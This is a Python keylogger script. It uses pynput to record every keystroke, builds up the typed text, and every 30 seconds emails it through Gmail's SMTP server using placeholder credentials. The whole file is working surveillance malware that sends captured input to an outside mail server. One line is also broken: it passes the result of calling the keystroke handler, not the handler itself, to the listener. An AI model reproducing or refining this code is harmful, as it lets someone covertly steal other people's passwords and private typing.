import optparse

import pynput.keyboard
import smtplib
import threading
keystrokes=""


def call_keystrokes_function(key):
    global keystrokes
    try:
        #keystrokes = keystrokes + key.char.encode('utf-8')
        keystrokes= keystrokes+ str(key.char)
    except AttributeError:
        if key == key.space:
            keystrokes = keystrokes+ " "
        else:
            keystrokes = keystrokes+ str(key)
    except:
        pass

    print(keystrokes)

def send_email(email,password,message):
    email_server = smtplib.SMTP("smtp.gmail.com",587)
    email_server.starttls()
    email_server.login(email,password)
    email_server.sendmail(email,email,message)
    email_server.quit()

#thread - threading

def thread_function():
    global keystrokes
    send_email("user@gmail.com", "password", keystrokes.encode('utf-8'))
    keystrokes = ""  #this sentece resets keystrokes
    timer_object = threading.Timer(30,thread_function)
    timer_object.start()

keylogger_listener = pynput.keyboard.Listener(on_press=call_keystrokes_function())
with keylogger_listener:
    thread_function()
    keylogger_listener.join()